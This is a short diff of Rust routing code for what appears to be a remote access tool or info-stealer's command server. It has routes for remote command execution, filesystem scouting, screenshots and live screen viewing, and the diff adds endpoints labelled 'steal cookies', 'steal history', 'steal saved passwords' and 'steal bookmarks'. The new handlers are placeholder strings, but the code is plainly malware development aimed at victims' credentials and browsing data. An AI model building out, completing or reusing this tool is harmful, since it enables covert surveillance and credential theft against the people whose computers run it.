@@ -18,8 +18,11 @@ pub fn all_routes(shellstate: Arc<Mutex<ShellState>>) -> Router {
         .route("/exec", post(exec::exec_cmd))
         .route("/fsxp", post(fsxp::scout_path))
         // routes for easier access
-        .route("/cookie", post("steal cookies"))
         .route("/fetch", post(fetch::fetch_sys_info))
+        .route("/cookie", post("steal cookies"))
+        .route("/history", post("steal history"))
+        .route("/autofill", post("steal saved passwords"))
+        .route("/bookmarks", post("steal bookmarks"))
         // routes for real time data
         .route("/skrin/snap", post(scrn::screenshot))
         .route("/skrin", post("real time screen"))
